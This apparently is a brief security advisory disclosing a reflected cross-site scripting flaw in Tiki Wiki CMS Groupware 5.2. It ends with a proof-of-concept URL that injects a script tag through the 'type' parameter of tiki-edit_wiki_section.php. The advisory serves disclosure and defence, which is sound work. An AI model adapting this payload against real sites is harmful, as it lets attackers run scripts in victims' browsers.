@@ -1,0 +1,21 @@
+------------------------------------------------------------------------
+Software................Tiki Wiki CMS Groupware 5.2
+Vulnerability...........Reflected Cross-site Scripting
+Download................htp://www.tiki.org
+Release Date............9/24/2010
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................John Leitch
+Site....................http://www.johnleitch.net/
+Email...................john.leitch5@gmail.com
+------------------------------------------------------------------------
+
+--Description--
+
+A reflected cross-site scripting vulnerability in Tiki Wiki CMS
+Groupware 5.2 can be exploited to execute arbitrary JavaScript.
+
+
+--PoC--
+
+http://localhost/tiki-5.2/tiki-edit_wiki_section.php?type=%22%3E%3Cscript%3Ealert(0)%3C/script%3E
